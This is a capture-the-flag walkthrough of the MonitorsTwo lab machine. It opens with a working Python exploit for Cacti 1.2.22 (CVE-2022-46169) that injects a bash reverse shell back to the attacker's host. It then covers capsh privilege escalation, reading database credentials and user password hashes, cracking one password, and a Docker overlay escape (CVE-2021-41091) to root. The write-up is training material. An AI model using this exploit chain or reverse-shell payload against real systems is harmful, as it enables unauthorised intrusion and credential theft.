Access to http://10.10.11.211:80/ and we found a webapp called Cacti v1.2.22. After some google research we found the vulnerability CVE-2022-46169 which affect this application, and in the **[exploit code](https://raw.githubusercontent.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/main/CVE-2022-46169.py)** we can see how it works. We write the following python script

```python
import requests
import urllib

headers = {"X-Forwarded-For": "127.0.0.1"}
url = "http://10.10.11.211/"

def isVuln():
	r = requests.get(f"{url}/remote_agent.php", headers=headers)
	return r.text != "FATAL: You are not authorized to use this service"

def bruteForce():
	for n in range(1,5):
		for n2 in range (1,18):
			vuln_url = f"{url}/remote_agent.php?action=polldata&poller_id=1&host_id={n}&local_data_ids[]={n2}"
			r = requests.get(vuln_url, headers=headers)
			if r.text != "[]":
				rd_name = r.json()[0]["rrd_name"]
				if rd_name == "polling_time" or rd_name == "uptime":
					print("Bruteforce success!")
					return True, n, n2
	return False, 1, 1

def reverseShell(host_id, data_ids):
	payload = "bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1'"
	payload_encoded = urllib.parse.quote(payload)
	inject_request = f"{url}/remote_agent.php?action=polldata&poller_id=;{payload_encoded}&host_id={host_id}&local_data_ids[]={data_ids}"
	r = requests.get(inject_request, headers=headers)

if __name__ == '__main__':
	if isVuln():
		print("Service vulnerable. Exploiting...")
		is_vuln, host_id, data_ids = bruteForce()
		if is_vuln:
			reverseShell(host_id, data_ids)
		else:
			print("Bruteforce failed")
	else:
		print("Service not vulnerable to CVE-2022-46169")
```

And catch the shell with a netcat listener

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/MonitorsTwo-10.10.11.211]
└─$ nc -nvlp 1234         
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.211] 45304
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ whoami
www-data
```

With a python server we upload the linpeas.sh script and retrieve some info

```bash

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid 
-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh

-----------------

╠Container╠
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... docker
═╣ Any running containers? ........ No
╔══════════╣ Docker Container details
═╣ Am I inside Docker group ....... No
═╣ Looking and enumerating Docker Sockets (if any):
═╣ Docker version ................. Not Found
═╣ Vulnerable to CVE-2019-5736 .... Not Found
═╣ Vulnerable to CVE-2019-13139 ... Not Found
═╣ Rootless Docker? ............... No

-----------------

╔══════════╣ MySQL version
mysql  Ver 15.1 Distrib 10.5.15-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper       

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 1126 Feb 18  2022 /etc/mysql/mariadb.cnf
[client-server]
socket = /run/mysqld/mysqld.sock

------------------

╔══════════╣ Executable files potentially added by user (limit 70)
2023-03-21+10:49:05.5477811100 /.dockerenv                                       
2023-01-05+11:37:15.8114713440 /entrypoint.sh
```

We found some info about /sbin/capsh execution, **[we can escalate privileges from here](https://gtfobins.github.io/gtfobins/capsh/)**. We also found that we are in a docker container, files that say that there is mysql db present and a script called entrypoint.sh which could be useful too. Lets escalate privileges with capsh

```bash
bash-5.1$ capsh --gid=0 --uid=0 --
capsh --gid=0 --uid=0 --
whoami
root
```

And we are root inside the container, but we cannot do anything more here so lets read the script

```bash
cat /entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

Interesting... It is connecting to db in port 3306 and then run some commands. Lets try to execute directly this commands

```bash
mysql --host=db --user=root --password=root cacti -e "show tables"

Tables_in_cacti
aggregate_graph_templates
aggregate_graph_templates_graph
[SNIP]
user_auth
user_auth_cache
[SNIP]
```

And we have printed the tables, lets try to retrieve some info about user_auth table

```bash
bash-5.1$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
< --password=root cacti -e "select * from user_auth"
id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees       policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on      on      2       1       1       1       1       on      -1-1       -1              0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1      -1              0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1       1       1       1       1       on      -1-1               on      0       0       2135691668
bash-5.1$
```

So blurry, lets take just username and password fields

```bash
bash-5.1$ mysql --host=db --user=root --password=root cacti -e "select username, password From user_auth"
<cacti -e "select username, password From user_auth"
username        password
admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
guest   43e9a4ab75570f5b
marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

Better, we have some hashes to crack with john. With command `john -w=/usr/share/wordlists/rockyou.txt marcus.hash` we got the credentials marcus:funkymonkey. Using ssh we can go in as marcus. Executing linpeas.sh again 

```bash
╔══════════╣ Mails (limit 50)
4721 4 -rw-r--r--   1 root     mail 1809 Oct 18  2021 /var/mail/marcus
4721 4 -rw-r--r--   1 root     mail 1809 Oct 18  2021 /var/spool/mail/marcus
 ```

In /var/mail/marcus we found this email

```text
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

Lets focus on the last vulnerabilty. Here we have a **[POC](https://github.com/UncleJ4ck/CVE-2021-41091)**. As is says, in the container (where we are root) we set the setuid bit on /bin/bash with the command `chmod u+s /bin/bash`. Then we upload the exploit and move it to the machine, and then execute

```bash
marcus@monitorstwo:/tmp$ ./exp.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
```

But we don't have a shell, so let's focus on this part

```bash
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'
```

So we do it

```bash
marcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# whoami
root
```

And we are root

